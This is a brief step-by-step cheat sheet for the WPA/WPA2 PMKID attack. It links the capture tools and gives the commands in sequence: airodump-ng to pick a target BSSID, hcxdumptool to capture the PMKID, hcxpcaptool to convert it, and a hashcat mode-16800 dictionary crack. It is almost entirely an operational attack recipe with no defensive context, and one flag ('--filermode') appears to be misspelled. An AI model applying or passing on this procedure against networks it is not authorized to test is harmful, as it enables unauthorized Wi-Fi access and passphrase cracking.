# WPA/WPA2 PMKID

STEP 1:
https://github.com/ZerBea/hcxdumptool
https://github.com/aircrack-ng/aircrack-ng

STEP 2: Find target BSSID:
airodump-ng <int>

STEP 3: Add BSSID in ‘bssid.txt’ and use ‘hcxdumptool’:
hcxdumptool -i <int> --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap

STEP 4: Extract PMKID into hashcat format for cracking:
(link: https://github.com/ZerBea/hcxtools) github.com/ZerBea/hcxtools
hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap

STEP 5: Crack:
hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt

> https://mobile.twitter.com/netmux/status/1097908867374215168
